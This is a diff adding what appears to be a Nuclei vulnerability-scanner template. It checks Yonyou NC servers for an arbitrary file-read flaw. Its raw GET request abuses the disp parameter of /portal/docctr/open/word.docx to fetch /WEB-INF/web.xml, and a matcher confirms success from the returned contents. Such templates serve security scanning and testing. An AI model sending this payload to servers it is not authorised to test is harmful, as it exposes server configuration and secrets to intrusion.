@@ -1,0 +1,22 @@
+id: yongyou-nc-word-fileread
+
+info:
+  name: yongyou-nc-word-fileread
+  author: yongyou-nc-word-fileread
+  severity: high
+
+requests:
+  - raw:
+      - |
+        GET /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains_all(body, 'init-param','param-name','param-value')"
